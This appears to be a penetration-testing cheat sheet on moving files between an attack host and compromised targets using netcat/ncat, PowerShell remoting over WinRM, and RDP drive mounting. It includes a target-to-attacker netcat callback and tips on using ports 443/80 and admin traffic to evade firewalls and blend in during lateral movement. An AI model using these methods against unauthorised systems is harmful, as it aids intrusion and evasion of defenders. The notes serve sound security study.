---
title: Miscellaneous Transfer Methods
tags: [file-transfer, netcat, powershell, rdp, winrm]
---

# Miscellaneous Transfer Methods

---

## Netcat / Ncat

### Target Receives, Attack Host Sends
```bash
# Target — listen and receive
nc -l -p 8000 > <file>
ncat -l -p 8000 --recv-only > <file>

# Attack host — send
nc -q 0 <targetIP> 8000 < <file>
ncat --send-only <targetIP> 8000 < <file>
```

### Attack Host Listens, Target Connects
Useful when the target can't accept inbound connections.

```bash
# Attack host — listen and serve file
sudo nc -l -p 443 -q 0 < <file>
sudo ncat -l -p 443 --send-only < <file>

# Target — connect and receive
nc <attackIP> 443 > <file>
ncat <attackIP> 443 --recv-only > <file>
```

!!! tip
    Use port 443 or 80 to blend in with normal HTTPS/HTTP traffic and avoid firewall blocks.

---

## PowerShell Remoting (WinRM)

Transfer files between Windows machines using an existing PowerShell session. Requires WinRM (port 5985) and admin rights on the destination.

**Scenario:** Transfer from DC01 to DATABASE01 as Administrator.

```powershell
# Confirm WinRM is reachable on target
Test-NetConnection -ComputerName DATABASE01 -Port 5985

# Create PS remoting session
$Session = New-PSSession -ComputerName DATABASE01

# Push file to remote machine
Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\

# Pull file from remote machine
Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

!!! tip
    PowerShell remoting transfers are encrypted and blend in with normal admin traffic — ideal for lateral movement scenarios where you already have credentials.

---

## RDP (Remote Desktop)

Mount a local folder into an RDP session — files appear as a network drive on the remote machine.

```bash
# Using rdesktop
rdesktop <IP> -d <DOMAIN> -u <user> -p '<password>' -r disk:linux='/home/user/files'

# Using xfreerdp
xfreerdp /v:<IP> /d:<DOMAIN> /u:<user> /p:'<password>' /drive:linux,/home/user/filetransfer
```

!!! tip
    `/drive:linux,/path` mounts your local path as `\\tsclient\linux` inside the RDP session. You can drag and drop or use `copy` from there.
